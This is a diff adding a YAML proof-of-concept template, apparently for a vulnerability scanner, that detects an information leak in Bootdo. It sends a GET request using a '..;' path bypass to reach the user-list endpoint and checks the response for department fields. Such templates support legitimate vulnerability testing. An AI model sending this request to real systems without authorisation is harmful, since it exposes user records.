@@ -1,0 +1,20 @@
+id: poc-yaml-bootdo-user-info-leak
+info:
+  name: Bootdo 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: Bootdo
+  osprey-id: vb_2021_0057
+requests:
+- method: GET
+  path: /css/..;/sys/user/list?limit=100&offset=0&name=&depId=
+  expression: 'status_code == 200 &&
+
+    contains(body, "deptId") &&
+
+    contains(body, "deptName")
+
+    '
+variables: {}
+transport: http
